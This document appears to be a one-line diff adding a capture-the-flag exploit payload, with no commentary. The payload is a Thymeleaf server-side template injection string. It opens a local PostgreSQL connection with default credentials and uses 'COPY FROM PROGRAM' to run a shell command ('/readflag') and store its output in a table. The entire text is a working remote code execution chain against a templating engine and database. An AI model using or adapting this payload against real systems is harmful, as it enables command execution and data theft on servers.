@@ -1,0 +1,1 @@
+redirect:/?exfil=[# th:with="a=${new org.postgresql.Driver().connect('jdbc:postgresql://127.0.0.1:5432/postgres?user=postgres&password=postgres', null).createStatement().executeUpdate('copy messages from program ''echo -n 6942069,1, ; echo -n `/readflag` ; echo ,2024-01-01'' csv;')}"][/]
